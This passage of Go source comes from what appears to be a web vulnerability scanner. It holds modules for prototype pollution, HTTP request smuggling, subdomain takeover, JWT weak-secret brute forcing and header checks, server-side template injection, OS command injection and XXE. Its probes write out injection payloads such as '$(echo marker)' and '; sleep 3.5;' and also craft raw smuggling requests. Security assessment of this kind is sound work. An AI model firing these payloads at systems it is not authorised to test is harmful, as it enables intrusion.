					if strings.Contains(strings.ToLower(b), strings.ToLower(f)) {
						c.addF("mass", fmt.Sprintf("Mass assign: %s=%s", f, v), "HIGH",
							fmt.Sprintf("EP: %s\nField: %s\nResponse: %s", ep, f, trunc(b, 200)),
							fmt.Sprintf("curl -sk -X POST '%s%s' -d '%s'", c.Base, ep, string(pl)))
					}
				}
				time.Sleep(50 * time.Millisecond)
			}
		}
	}
}

func runProto(c *Ctx) {
	c.phase("PROTO POLLUTION")
	if !c.Args.Active {
		c.addF("proto", "Prototype pollution probe skipped (use --active)", "INFO", "", "")
		return
	}
	pls := []string{
		`{"__proto__":{"isAdmin":true}}`,
		`{"__proto__":{"admin":true}}`,
		`{"__proto__":{"role":"admin"}}`,
		`{"__proto__":{"is_admin":1}}`,
		`{"constructor":{"prototype":{"isAdmin":true}}}`,
		`{"constructor":{"prototype":{"role":"admin"}}}`,
	}
	for _, ep := range []string{"/api/login", "/api/register", "/api/users", "/api/profile", "/api/update", "/api/me"} {
		for _, pl := range pls {
			r, b := c.post(ep, nil, pl, "application/json")
			if r != nil && (r.StatusCode == 200 || r.StatusCode == 201) {
				bl := strings.ToLower(b)
				if strings.Contains(bl, "isadmin") || strings.Contains(bl, "\"admin\"") || strings.Contains(bl, "role") {
					if !strings.Contains(bl, "error") && !strings.Contains(bl, "invalid") {
						c.addF("proto", "Prototype pollution", "HIGH",
							fmt.Sprintf("EP: %s\nPayload: %s\nResponse: %s", ep, pl, trunc(b, 200)),
							fmt.Sprintf("curl -sk -X POST '%s%s' -d '%s'", c.Base, ep, pl))
					}
				}
			}
			time.Sleep(50 * time.Millisecond)
		}
	}
}

func (c *Ctx) rawSocketReq(raw string) (string, error) {
	pu, err := url.Parse(c.Base)
	if err != nil {
		return "", err
	}
	port := pu.Port()
	if port == "" {
		if pu.Scheme == "https" {
			port = "443"
		} else {
			port = "80"
		}
	}
	addr := net.JoinHostPort(pu.Hostname(), port)
	var conn net.Conn
	d := net.Dialer{Timeout: 4 * time.Second}
	if pu.Scheme == "https" {
		conn, err = tls.DialWithDialer(&d, "tcp", addr, &tls.Config{
			InsecureSkipVerify: c.Args.Insecure,
			ServerName:         pu.Hostname(),
		})
	} else {
		conn, err = d.DialContext(c.ctx, "tcp", addr)
	}
	if err != nil {
		return "", err
	}
	defer conn.Close()

	_ = conn.SetDeadline(time.Now().Add(5 * time.Second))
	if _, err := conn.Write([]byte(raw)); err != nil {
		return "", err
	}

	buf := make([]byte, 4096)
	n, _ := conn.Read(buf)
	return string(buf[:n]), nil
}

func runSmuggling(c *Ctx) {
	c.phase("SMUGGLING (RAW SOCKET)")
	if !c.Args.Active {
		c.addF("smuggling", "Request smuggling probe skipped (use --active)", "INFO", "", "")
		return
	}

	// 1. Raw Socket CL.TE Probe
	clteRaw := fmt.Sprintf("POST / HTTP/1.1\r\nHost: %s\r\nUser-Agent: %s\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 4\r\nTransfer-Encoding: chunked\r\n\r\n1\r\nZ\r\nQ", c.Host, c.userAgent())
	st1 := time.Now()
	resp1, err1 := c.rawSocketReq(clteRaw)
	dur1 := time.Since(st1).Seconds()

	if err1 == nil && (strings.Contains(resp1, "HTTP/1.1 200") || strings.Contains(resp1, "HTTP/1.1 404") || dur1 > 3.5) {
		c.addF("smuggling", "Possible CL.TE Smuggling (Raw Socket)", "HIGH",
			fmt.Sprintf("Duration: %.2fs\nResponse snippet: %s", dur1, trunc(resp1, 200)), "")
	}

	// 2. Raw Socket TE.CL Probe
	teclRaw := fmt.Sprintf("POST / HTTP/1.1\r\nHost: %s\r\nUser-Agent: %s\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 6\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nX", c.Host, c.userAgent())
	st2 := time.Now()
	resp2, err2 := c.rawSocketReq(teclRaw)
	dur2 := time.Since(st2).Seconds()

	if err2 == nil && (strings.Contains(resp2, "HTTP/1.1 200") || dur2 > 3.5) {
		c.addF("smuggling", "Possible TE.CL Smuggling (Raw Socket)", "HIGH",
			fmt.Sprintf("Duration: %.2fs\nResponse snippet: %s", dur2, trunc(resp2, 200)), "")
	}
}

func runSubTakeover(c *Ctx) {
	c.phase("SUBDOMAIN TAKEOVER")
	if c.isLocal() || c.IsIP {
		c.addF("subtakeover", "Skipped for local/IP target", "INFO", "", "")
		return
	}
	fp := map[string]string{
		"Heroku": "herokucdn.com/bill/deployment",
		"GitHub": "There isn't a GitHub Pages site here",
		"S3":     "NoSuchBucket",
		"Azure":  "404 Web Site not found",
		"Fastly": "Fastly error: unknown domain",
		"Surge":  "project not found",
	}
	common := []string{"dev", "staging", "test", "api", "admin", "mail", "vpn", "remote", "old", "new", "beta", "demo"}
	candidates := make(map[string]bool)
	for _, s := range common {
		candidates[s+"."+c.Host] = true
	}
	for _, sub := range c.Subdomains {
		candidates[sub] = true
	}
	for sub := range candidates {
		u := "https://" + sub
		r, b := c.externalGet(u, nil)
		if r == nil {
			u2 := "http://" + sub
			r, b = c.externalGet(u2, nil)
		}
		if r == nil {
			continue
		}
		for svc, fpStr := range fp {
			if strings.Contains(b, fpStr) {
				c.addF("subtakeover", fmt.Sprintf("Subdomain takeover: %s (%s)", sub, svc), "CRITICAL",
					fmt.Sprintf("Subdomain: %s\nService: %s\nFingerprint: %s", sub, svc, fpStr),
					fmt.Sprintf("curl -sk '%s'", u))
			}
		}
		time.Sleep(time.Duration(c.Delay * float64(time.Second)))
	}
}

func runSubdomain(c *Ctx) {
	c.phase("SUBDOMAIN ENUM (crt.sh)")
	if c.isLocal() || c.IsIP {
		c.addF("subdomain", "Skipped for local/IP target", "INFO", "", "")
		return
	}
	bd := c.baseDomain(c.Host)
	apiURL := fmt.Sprintf("https://crt.sh/?q=%%25.%s&output=json", url.QueryEscape(bd))
	req, err := http.NewRequestWithContext(c.ctx, "GET", apiURL, nil)
	if err != nil {
		return
	}
	req.Header.Set("User-Agent", c.userAgent())
	resp, err := c.ExternalClient.Do(req)
	if err != nil {
		c.addF("subdomain", "crt.sh unavailable", "INFO", err.Error(), "")
		return
	}
	body, _ := io.ReadAll(resp.Body)
	resp.Body.Close()
	if resp.StatusCode != 200 {
		c.addF("subdomain", fmt.Sprintf("crt.sh status %d", resp.StatusCode), "INFO", "", "")
		return
	}

	var certs []struct {
		NameValue string `json:"name_value"`
	}
	if err := json.Unmarshal(body, &certs); err != nil {
		c.addF("subdomain", "crt.sh parse error", "INFO", err.Error(), "")
		return
	}

	subMap := make(map[string]bool)
	for _, cert := range certs {
		for _, rawSub := range strings.Split(cert.NameValue, "\n") {
			s := strings.ToLower(strings.TrimSpace(rawSub))
			s = strings.TrimPrefix(s, "*.")
			if s != "" && (s == bd || strings.HasSuffix(s, "."+bd)) {
				subMap[s] = true
			}
		}
	}

	var subList []string
	for s := range subMap {
		subList = append(subList, s)
	}
	sort.Strings(subList)

	c.mu.Lock()
	c.Subdomains = subList
	c.mu.Unlock()

	if len(subList) == 0 {
		c.addF("subdomain", "No subdomains found in CT logs", "INFO", "", "")
		return
	}

	c.addF("subdomain", fmt.Sprintf("Discovered %d subdomains via crt.sh", len(subList)), "INFO",
		strings.Join(subList[:min(25, len(subList))], ", "), "")

	// Probe liveness of discovered subdomains
	var liveSubs []string
	var liveMu sync.Mutex
	probeSub := func(sub string) {
		r, _ := c.externalGet("https://"+sub, nil)
		if r == nil {
			r, _ = c.externalGet("http://"+sub, nil)
		}
		if r != nil {
			liveMu.Lock()
			liveSubs = append(liveSubs, sub)
			liveMu.Unlock()
		}
	}
	workerPool(subList, min(c.Args.Threads, 15), probeSub)

	if len(liveSubs) > 0 {
		c.addF("subdomain", fmt.Sprintf("Live subdomains: %d/%d", len(liveSubs), len(subList)), "LOW",
			strings.Join(liveSubs[:min(20, len(liveSubs))], "\n"), "")
	}
}

func runOpenAPI(c *Ctx) {
	c.phase("OPENAPI/SWAGGER")
	paths := []string{"/openapi.json", "/swagger.json", "/swagger/v1/swagger.json", "/api-docs", "/api/openapi.json", "/v1/swagger.json", "/apispec_1.json"}
	for _, p := range paths {
		r, b := c.get(p, nil)
		if r == nil || r.StatusCode != 200 {
			continue
		}
		if !strings.Contains(r.Header.Get("Content-Type"), "json") {
			continue
		}
		var spec map[string]interface{}
		if err := json.Unmarshal([]byte(b), &spec); err != nil {
			continue
		}
		pathsData, _ := spec["paths"].(map[string]interface{})
		if pathsData == nil {
			continue
		}
		var endpoints []string
		for ep := range pathsData {
			endpoints = append(endpoints, ep)
		}
		if len(endpoints) == 0 {
			continue
		}
		c.addF("openapi", fmt.Sprintf("OpenAPI spec exposed: %d endpoints", len(endpoints)), "HIGH",
			fmt.Sprintf("Spec: %s%s\nEndpoints:\n%s", c.Base, p, strings.Join(endpoints[:min(30, len(endpoints))], "\n")),
			fmt.Sprintf("curl -sk '%s%s'", c.Base, p))
		for ep, epData := range pathsData {
			epMap, _ := epData.(map[string]interface{})
			if epMap == nil {
				continue
			}
			for method, opData := range epMap {
				opMap, _ := opData.(map[string]interface{})
				if opMap == nil {
					continue
				}
				var epParams []string
				params, _ := opMap["parameters"].([]interface{})
				for _, param := range params {
					pm, _ := param.(map[string]interface{})
					if pm == nil {
						continue
					}
					pn, _ := pm["name"].(string)
					if pn != "" {
						epParams = append(epParams, pn)
						c.addF("openapi", fmt.Sprintf("API param: %s %s ?%s", strings.ToUpper(method), ep, pn), "INFO",
							fmt.Sprintf("Endpoint: %s %s\nParam: %s", method, ep, pn), "")
					}
				}
				c.mu.Lock()
				c.APIEndpoints = append(c.APIEndpoints, APIEndpoint{
					Path:   ep,
					Method: strings.ToUpper(method),
					Params: epParams,
					Source: "openapi",
				})
				c.mu.Unlock()

				// Active probing of discovered API endpoint
				if c.Args.Active {
					testURL := c.Base + ep
					if strings.ToUpper(method) == "GET" {
						tr, tb := c.get(ep, nil)
						if tr != nil && tr.StatusCode == 200 && len(tb) > 0 {
							for _, sensitive := range []string{"user", "admin", "config", "token", "key", "secret", "password"} {
								if strings.Contains(strings.ToLower(ep), sensitive) {
									c.addF("openapi", "Exposed sensitive API endpoint: "+ep, "HIGH",
										fmt.Sprintf("URL: %s\nStatus: 200\nBody: %s", testURL, trunc(tb, 200)),
										fmt.Sprintf("curl -isk '%s'", testURL))
									break
								}
							}
						}
					}
				}
			}
		}
		if sec, _ := spec["securityDefinitions"].(map[string]interface{}); sec != nil {
			for scheme, data := range sec {
				c.addF("openapi", fmt.Sprintf("Auth scheme: %s", scheme), "INFO",
					fmt.Sprintf("Scheme: %s\nConfig: %v", scheme, data), "")
			}
		}
		return
	}
}

func runJWT(c *Ctx) {
	c.phase("JWT ANALYSIS")
	ensureCrawled(c)
	tokenRe := regexp.MustCompile("eyJ[A-Za-z0-9_-]{10,}\\.([A-Za-z0-9_-]{10,})\\.[A-Za-z0-9_-]{10,}")
	var tokens []string
	seen := make(map[string]bool)
	for _, pg := range c.Crawled {
		ms := tokenRe.FindAllString(pg.Text, -1)
		for _, t := range ms {
			if !seen[t] {
				seen[t] = true
				tokens = append(tokens, t)
			}
		}
	}
	for _, js := range c.JSBlobs {
		ms := tokenRe.FindAllString(js, -1)
		for _, t := range ms {
			if !seen[t] {
				seen[t] = true
				tokens = append(tokens, t)
			}
		}
	}
	if len(tokens) == 0 {
		c.addF("jwt", "No JWT tokens found", "INFO", "", "")
		return
	}
	for _, tok := range tokens {
		parts := strings.Split(tok, ".")
		if len(parts) < 2 {
			continue
		}
		header, err := base64urlDecode(parts[0])
		if err != nil {
			continue
		}
		payload, err := base64urlDecode(parts[1])
		if err != nil {
			continue
		}
		c.addF("jwt", "JWT token found", "MEDIUM",
			fmt.Sprintf("Token: %s...\nHeader: %s\nPayload: %s", trunc(tok, 50), header, trunc(payload, 300)), "")
		var hdr map[string]interface{}
		if json.Unmarshal([]byte(header), &hdr) == nil {
			alg, _ := hdr["alg"].(string)
			if strings.ToLower(alg) == "none" {
				c.addF("jwt", "JWT alg:none detected", "CRITICAL",
					"Token allows alg:none — signature bypass possible", "")
			}
			if strings.ToLower(alg) == "hs256" {
				secrets := []string{"secret", "password", "123456", "admin", "key", "jwt", "token", "supersecret", "change-me"}
				for _, s := range secrets {
					h := hmac.New(sha256.New, []byte(s))
					h.Write([]byte(parts[0] + "." + parts[1]))
					sig := base64.RawURLEncoding.EncodeToString(h.Sum(nil))
					if sig == parts[2] {
						c.addF("jwt", fmt.Sprintf("JWT weak secret: %s", s), "CRITICAL",
							fmt.Sprintf("Secret: %s\nToken: %s", s, trunc(tok, 50)), "")
						break
					}
				}
			}
			// Advanced JWT checks
			if jku, ok := hdr["jku"].(string); ok && jku != "" {
				c.addF("jwt", "JWT jku header present", "HIGH",
					fmt.Sprintf("jku: %s\nAn attacker could point jku to a malicious JWKS endpoint", jku), "")
			}
			if _, ok := hdr["jwk"]; ok {
				c.addF("jwt", "JWT jwk header present (embedded key)", "HIGH",
					"Token contains embedded JWK — possible key injection", "")
			}
			if kid, ok := hdr["kid"].(string); ok && kid != "" {
				// Check for path traversal patterns in kid
				if strings.Contains(kid, "..") || strings.Contains(kid, "/") {
					c.addF("jwt", "JWT kid path traversal", "CRITICAL",
						fmt.Sprintf("kid: %s", kid), "")
				}
				// Check for SQL injection patterns in kid
				kidLower := strings.ToLower(kid)
				if strings.Contains(kidLower, "'") || strings.Contains(kidLower, "union") || strings.Contains(kidLower, "select") {
					c.addF("jwt", "JWT kid SQL injection", "CRITICAL",
						fmt.Sprintf("kid: %s", kid), "")
				}
			}
			// Algorithm confusion: RS256 token with HS256 potential
			if strings.ToUpper(alg) == "RS256" || strings.ToUpper(alg) == "RS384" || strings.ToUpper(alg) == "RS512" {
				c.addF("jwt", "JWT uses RSA algorithm — test alg confusion (RS→HS)", "MEDIUM",
					fmt.Sprintf("Algorithm: %s\nTry signing with HS256 using public key as secret", alg), "")
			}
		}
	}
}

func runCSP(c *Ctx) {
	c.phase("CSP ANALYSIS")
	r, _ := c.get("/", nil)
	if r == nil {
		return
	}
	csp := r.Header.Get("Content-Security-Policy")
	if csp == "" {
		c.addF("csp", "CSP missing", "INFO", "", "")
		return
	}
	var issues []string
	if strings.Contains(csp, "unsafe-inline") {
		issues = append(issues, "unsafe-inline detected")
	}
	if strings.Contains(csp, "unsafe-eval") {
		issues = append(issues, "unsafe-eval detected")
	}
	if strings.Contains(csp, "*") {
		issues = append(issues, "wildcard * in CSP")
	}
	if !strings.Contains(csp, "default-src") {
		issues = append(issues, "missing default-src")
	}
	if !strings.Contains(csp, "script-src") {
		issues = append(issues, "missing script-src")
	}
	if !strings.Contains(csp, "object-src") {
		issues = append(issues, "missing object-src")
	}
	if len(issues) > 0 {
		c.addF("csp", fmt.Sprintf("CSP weaknesses: %d", len(issues)), "MEDIUM",
			fmt.Sprintf("CSP: %s\nIssues:\n%s", trunc(csp, 200), strings.Join(issues, "\n")), "")
	} else {
		c.addF("csp", "CSP looks good", "INFO", trunc(csp, 200), "")
	}
}

func runWASM(c *Ctx) {
	c.phase("WASM/SW ANALYSIS")
	ensureCrawled(c)
	for _, pg := range c.Crawled {
		swRe := regexp.MustCompile("(?:navigator\\.)?serviceWorker\\.register\\(['\"]([^'\"]+)['\"]")
		for _, m := range swRe.FindAllStringSubmatch(pg.Text, -1) {
			swURL := urljoin(c.Base, m[1])
			r, b := c.get(swURL, nil)
			if r != nil && r.StatusCode == 200 {
				c.addF("wasm", fmt.Sprintf("Service Worker: %s", m[1]), "INFO",
					fmt.Sprintf("URL: %s\nContent: %s", swURL, trunc(b, 200)), "")
				for _, ep := range regexp.MustCompile("['\"](/[a-zA-Z0-9_\\-/.]+)['\"]").FindAllString(b, -1) {
					c.addF("wasm", fmt.Sprintf("SW endpoint: %s", ep), "INFO", swURL, "")
				}
			}
		}
		wasmRe := regexp.MustCompile("src=['\"]([^'\"]+\\.wasm)['\"]")
		for _, m := range wasmRe.FindAllStringSubmatch(pg.Text, -1) {
			wasmURL := urljoin(c.Base, m[1])
			r, _ := c.get(wasmURL, nil)
			if r != nil && r.StatusCode == 200 {
				c.addF("wasm", fmt.Sprintf("WASM binary: %s", m[1]), "INFO",
					fmt.Sprintf("URL: %s", wasmURL), "")
			}
		}
	}
}

func runOAuth(c *Ctx) {
	c.phase("OAUTH")
	ensureCrawled(c)
	oauthParams := []string{"client_id", "redirect_uri", "response_type", "scope", "state", "code", "access_token"}
	for _, pg := range c.Crawled {
		pu, _ := url.Parse(pg.URL)
		qs := pu.Query()
		for _, p := range oauthParams {
			if qs.Get(p) != "" {
				c.addF("oauth", fmt.Sprintf("OAuth param: %s", p), "INFO",
					fmt.Sprintf("URL: %s\nParam: %s=%s", pg.URL, p, qs.Get(p)), "")
			}
		}
		rd := qs.Get("redirect_uri")
		if rd != "" {
			// Only check absolute redirect_uri values — relative paths are safe.
			isAbs := strings.HasPrefix(rd, "http://") || strings.HasPrefix(rd, "https://")
			if isAbs && !strings.Contains(rd, c.Host) {
				c.addF("oauth", "Open redirect_uri in OAuth", "HIGH",
					fmt.Sprintf("redirect_uri: %s\nDoes not match host: %s", rd, c.Host), "")
			}
			if isAbs && !strings.HasPrefix(rd, "https://") {
				c.addF("oauth", "OAuth redirect_uri not HTTPS", "MEDIUM",
					fmt.Sprintf("redirect_uri: %s", rd), "")
			}
		}
		if qs.Get("client_id") != "" && qs.Get("state") == "" {
			c.addF("oauth", "OAuth missing state parameter (CSRF)", "HIGH",
				fmt.Sprintf("URL: %s", pg.URL), "")
		}
	}
}

func runDeser(c *Ctx) {
	c.phase("DESERIALIZATION")
	r, b := c.get("/", nil)
	if r == nil {
		return
	}
	for _, ck := range r.Cookies() {
		cv := ck.Value
		if strings.HasPrefix(cv, "a:") || strings.HasPrefix(cv, "O:") {
			c.addF("deser", fmt.Sprintf("PHP serialized cookie: %s", ck.Name), "HIGH",
				fmt.Sprintf("Cookie: %s=%s", ck.Name, trunc(cv, 100)), "")
		}
		if strings.HasPrefix(cv, "rO0") {
			c.addF("deser", fmt.Sprintf("Java serialized cookie: %s", ck.Name), "CRITICAL",
				fmt.Sprintf("Cookie: %s=%s", ck.Name, trunc(cv, 100)), "")
		}
		if strings.HasPrefix(cv, "AAEAAAD/////") {
			c.addF("deser", fmt.Sprintf(".NET serialized cookie: %s", ck.Name), "CRITICAL",
				fmt.Sprintf("Cookie: %s=%s", ck.Name, trunc(cv, 100)), "")
		}
	}
	if strings.Contains(b, "rO0") || strings.Contains(b, "ACED0005") {
		c.addF("deser", "Java serialized object in response", "HIGH", trunc(b, 200), "")
	}
}

func runSSTI(c *Ctx) {
	c.phase("SSTI (TEMPLATE INJECTION)")
	if !requireActive(c, "ssti", "SSTI probe") {
		return
	}
	ensureCrawled(c)
	probes := []struct {
		payload string
		result  string
		engine  string
	}{
		{"{{1337*7331}}", "9801547", "Jinja2/Twig/Nunjucks"},
		{"${1337*7331}", "9801547", "Freemarker/Velocity/SpringEL"},
		{"<%= 1337*7331 %>", "9801547", "ERB/EJS"},
		{"#{1337*7331}", "9801547", "Pug/Spring"},
		{"*{1337*7331}", "9801547", "Thymeleaf"},
		{"{{7*'7'}}", "7777777", "Jinja2"},
	}

	// 1. Test URL parameters
	for _, pg := range c.Crawled {
		pu, _ := url.Parse(pg.URL)
		qs := pu.Query()
		if len(qs) == 0 {
			continue
		}
		for pm := range qs {
			for _, pr := range probes {
				fq := url.Values{}
				for k, vs := range qs {
					for _, v := range vs {
						fq.Add(k, v)
					}
				}
				fq.Set(pm, pr.payload)
				fu := pu.Scheme + "://" + pu.Host + pu.Path + "?" + fq.Encode()
				r, b := c.get(fu, nil)
				if r != nil && strings.Contains(b, pr.result) && !strings.Contains(pg.Text, pr.result) {
					c.addF("ssti", fmt.Sprintf("SSTI confirmed (%s): ?%s", pr.engine, pm), "CRITICAL",
						fmt.Sprintf("URL: %s\nPayload: %s\nEvaluated Result: %s\nEngine: %s", fu, pr.payload, pr.result, pr.engine),
						fmt.Sprintf("curl -isk '%s'", fu))
					break
				}
			}
		}
	}

	// 2. Test discovered forms
	for _, form := range c.Forms {
		if len(form.Fields) == 0 {
			continue
		}
		for _, fld := range form.Fields {
			if fld.Type == "hidden" || fld.Type == "submit" {
				continue
			}
			for _, pr := range probes[:2] {
				vals := url.Values{}
				for _, f := range form.Fields {
					if f.Name == fld.Name {
						vals.Set(f.Name, pr.payload)
					} else {
						vals.Set(f.Name, "test")
					}
				}
				var r *http.Response
				var b string
				if form.Method == "POST" {
					r, b = c.post(form.Action, nil, vals.Encode(), "application/x-www-form-urlencoded")
				} else {
					tu := form.Action
					if strings.Contains(tu, "?") {
						tu += "&" + vals.Encode()
					} else {
						tu += "?" + vals.Encode()
					}
					r, b = c.get(tu, nil)
				}
				if r != nil && strings.Contains(b, pr.result) {
					c.addF("ssti", fmt.Sprintf("Form SSTI (%s): %s [%s]", pr.engine, form.Action, fld.Name), "CRITICAL",
						fmt.Sprintf("Form: %s %s\nField: %s\nPayload: %s", form.Method, form.Action, fld.Name, pr.payload),
						fmt.Sprintf("curl -isk -X %s '%s'", form.Method, form.Action))
					break
				}
			}
		}
	}
}

func runRCE(c *Ctx) {
	c.phase("COMMAND INJECTION (RCE)")
	if !requireActive(c, "rce", "Command-injection probe") {
		return
	}
	ensureCrawled(c)
	echoMarker := "dfrce_" + c.rand(6)
	cmdPayloads := []string{
		";echo " + echoMarker + ";",
		"|echo " + echoMarker,
		"&echo " + echoMarker + "&",
		"`echo " + echoMarker + "`",
		"$(echo " + echoMarker + ")",
	}

	// 1. Echo reflection probe
	for _, pg := range c.Crawled {
		pu, _ := url.Parse(pg.URL)
		qs := pu.Query()
		if len(qs) == 0 {
			continue
		}
		for pm := range qs {
			for _, pl := range cmdPayloads {
				fq := url.Values{}
				for k, vs := range qs {
					for _, v := range vs {
						fq.Add(k, v)
					}
				}
				fq.Set(pm, pl)
				fu := pu.Scheme + "://" + pu.Host + pu.Path + "?" + fq.Encode()
				r, b := c.get(fu, nil)
				if r != nil && strings.Contains(b, echoMarker) {
					c.addF("rce", "OS Command Injection (Echo Reflected): ?"+pm, "CRITICAL",
						fmt.Sprintf("URL: %s\nParam: %s\nPayload: %s\nReflected Marker: %s", fu, pm, pl, echoMarker),
						fmt.Sprintf("curl -isk '%s'", fu))
					break
				}
			}
		}
	}

	// 2. Active time-delay probe
	if c.Args.Active {
		timePayloads := []string{";sleep 3.5;", "&timeout /t 4&"}
		for _, pg := range c.Crawled[:min(3, len(c.Crawled))] {
			pu, _ := url.Parse(pg.URL)
			qs := pu.Query()
			for pm := range qs {
				st0 := time.Now()
				c.get(pg.URL, nil)
				baseDur := time.Since(st0).Seconds()

				for _, tpl := range timePayloads {
					fq := url.Values{}
					for k, vs := range qs {
						for _, v := range vs {
							fq.Add(k, v)
						}
					}
					fq.Set(pm, tpl)
					fu := pu.Scheme + "://" + pu.Host + pu.Path + "?" + fq.Encode()
					st1 := time.Now()
					r, _ := c.get(fu, nil)
					dur := time.Since(st1).Seconds()
					if r != nil && dur >= baseDur+3.0 {
						c.addF("rce", "Time-based Command Injection: ?"+pm, "CRITICAL",
							fmt.Sprintf("URL: %s\nParam: %s\nPayload: %s\nBaseline: %.2fs -> Delay: %.2fs", fu, pm, tpl, baseDur, dur),
							fmt.Sprintf("curl -isk '%s'", fu))
						break
					}
				}
			}
		}
	}
}

func runXXE(c *Ctx) {
	c.phase("XXE (XML EXTERNAL ENTITY)")
	if !requireActive(c, "xxe", "XXE probe") {
		return
	}
	marker := "DF_XXE_MARKER_" + c.rand(6)
	xxePayload := fmt.Sprintf(`<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [<!ENTITY xxe "%s">]><root><name>&xxe;</name><data>&xxe;</data><item>&xxe;</item></root>`, marker)

	xmlEndpoints := []string{"/api/xml", "/xml", "/soap", "/api/upload", "/api/import"}
	for _, ep := range c.APIEndpoints {
		xmlEndpoints = append(xmlEndpoints, ep.Path)
	}

	for _, ep := range xmlEndpoints[:min(10, len(xmlEndpoints))] {
		r, b := c.post(ep, map[string]string{"Accept": "application/xml, text/xml"}, xxePayload, "application/xml")
		if r == nil {
			continue
		}
		if strings.Contains(b, marker) {
			c.addF("xxe", "XXE entity expansion confirmed: "+ep, "CRITICAL",
				fmt.Sprintf("Endpoint: %s\nMarker reflected: %s\nResponse: %s", ep, marker, trunc(b, 200)),
				fmt.Sprintf("curl -isk -X POST '%s%s' -H 'Content-Type: application/xml' -d '%s'", c.Base, ep, xxePayload))
		} else if strings.Contains(strings.ToLower(b), "xml") && (r.StatusCode == 200 || r.StatusCode == 400 || r.StatusCode == 500) {
			for _, xmlErr := range []string{"entity", "doctype", "parsererror", "saxexception", "xmlstreamexception"} {
				if strings.Contains(strings.ToLower(b), xmlErr) {
					c.addF("xxe", "XML parser error/disclosure: "+ep, "MEDIUM",
						fmt.Sprintf("Endpoint: %s\nMatched error: %s\nResponse: %s", ep, xmlErr, trunc(b, 200)), "")
					break
				}
			}
		}
		time.Sleep(time.Duration(c.Delay * float64(time.Second)))
	}
}

func runDedup(c *Ctx) {
	c.phase("DEDUP")
	if len(c.Findings) == 0 {
		return
	}
	groups := make(map[string][]Finding)
	for _, f := range c.Findings {
		tn := f.Title
		tn = reDedupGen.ReplaceAllString(tn, ": *")
		k := f.Module + ":" + tn + ":" + f.Severity
		groups[k] = append(groups[k], f)
	}
	var deduped []Finding
	col := 0
	for _, items := range groups {
		if len(items) == 1 {
			deduped = append(deduped, items[0])
		} else {
			f := items[0]
			f.Title = f.Title + fmt.Sprintf(" (%d occurrences)", len(items))
			var ev []string
			for i := 0; i < min(10, len(items)); i++ {
				ev = append(ev, "  - "+items[i].Title)
			}
			f.Evidence = fmt.Sprintf("Grouped %d:\n%s", len(items), strings.Join(ev, "\n"))
			deduped = append(deduped, f)
			col += len(items) - 1
		}
	}
	c.saveJSON(filepath.Join(c.ResultDir, "report_deduped.json"),
		map[string]interface{}{"original": len(c.Findings), "deduped": len(deduped), "collapsed": col, "findings": deduped})
	fmt.Printf("[+] Dedup: %d → %d (collapsed %d)\n", len(c.Findings), len(deduped), col)
	c.Findings = deduped
}

func runDiff(c *Ctx) {
	c.phase("DIFF")
	if c.Args.Diff == "" {
		c.addF("diff", "No --diff dir provided", "INFO", "", "")
		return
	}
	pf := filepath.Join(c.Args.Diff, "report.json")
	if _, err := os.Stat(pf); err != nil {
		pf = filepath.Join(c.Args.Diff, "logs", "findings.jsonl")
	}
	var prevFindings []Finding
	if strings.HasSuffix(pf, ".jsonl") {
		f, err := os.Open(pf)
		if err != nil {
			c.addF("diff", "Cannot read prev", "INFO", pf, "")
			return
		}
		defer f.Close()
		dec := json.NewDecoder(f)
		for {
			var f Finding
			if err := dec.Decode(&f); err != nil {
				break
			}
			prevFindings = append(prevFindings, f)
		}
	} else {
		d, err := os.ReadFile(pf)
		if err != nil {
			c.addF("diff", "Cannot read prev", "INFO", pf, "")
			return
		}
		var data map[string]interface{}
		json.Unmarshal(d, &data)
		if fs, _ := data["findings"].([]interface{}); fs != nil {
			for _, f := range fs {
				if fm, _ := f.(map[string]interface{}); fm != nil {
					prevFindings = append(prevFindings, Finding{
						Module:   fmt.Sprintf("%v", fm["module"]),
						Title:    fmt.Sprintf("%v", fm["title"]),
						Severity: fmt.Sprintf("%v", fm["severity"]),
					})
				}
			}
		}
	}
	pk := make(map[string]bool)
	for _, f := range prevFindings {
		pk[f.Module+":"+f.Title+":"+f.Severity] = true
	}
	var newF, res []Finding
	for _, f := range c.Findings {
		if !pk[f.Module+":"+f.Title+":"+f.Severity] {
			newF = append(newF, f)
		}
	}
	ck := make(map[string]bool)
	for _, f := range c.Findings {
		ck[f.Module+":"+f.Title+":"+f.Severity] = true
	}
	for _, f := range prevFindings {
		if !ck[f.Module+":"+f.Title+":"+f.Severity] {
			res = append(res, f)
		}
	}
	fmt.Printf("[+] Diff: %d prev, %d current, %d new, %d resolved\n",
		len(prevFindings), len(c.Findings), len(newF), len(res))
	c.addF("diff", fmt.Sprintf("Diff: %d new, %d resolved", len(newF), len(res)), "INFO",
		fmt.Sprintf("Prev: %d\nNew: %d\nResolved: %d", len(prevFindings), len(newF), len(res)), "")
}

func runExternal(c *Ctx) {
	c.phase("EXTERNAL")
	tools := []string{"nmap", "ffuf", "nuclei", "sqlmap", "httpx", "subfinder", "nikto"}
	var avail []string
	for _, t := range tools {
		if p, err := exec.LookPath(t); err == nil && p != "" {
			avail = append(avail, t)
		}
	}
	if len(avail) > 0 {
		c.addF("external", "Tools available", "INFO", strings.Join(avail, ", "), "")
	}
	if c.Args.External {
		if _, err := exec.LookPath("nmap"); err == nil {
			out, _ := exec.Command("nmap", "-Pn", "-sT", "--top-ports", "100", c.Host).Output()
			c.saveTxt(filepath.Join(c.ResultDir, "nmap.txt"), string(out))
			ops := regexp.MustCompile(`(\d+/tcp)\s+open\s+([a-z0-9-]+)`).FindAllStringSubmatch(string(out), -1)
			if len(ops) > 0 {
				c.addF("external", "Nmap open ports", "INFO", fmt.Sprintf("%v", ops), "")
			}
		}
		if _, err := exec.LookPath("nuclei"); err == nil {
			out, _ := exec.Command("nuclei", "-u", c.Target, "-silent", "-json", "-severity", "low,medium,high,critical").Output()
			c.saveTxt(filepath.Join(c.ResultDir, "nuclei.txt"), string(out))
		}
	}
}

// === HELPER for JWT ===
func base64urlDecode(s string) (string, error) {
	// RawURLEncoding does NOT accept padding — try it first on the raw input.
	b, err := base64.RawURLEncoding.DecodeString(s)
	if err == nil {
		return string(b), nil
	}
	// Pad and retry with standard URLEncoding (which expects padding).
	padded := s
	for len(padded)%4 != 0 {
		padded += "="
	}
	b, err = base64.URLEncoding.DecodeString(padded)
	if err != nil {
		return "", err
	}
	return string(b), nil
}

// ============================================================================
// HELPERS
// ============================================================================

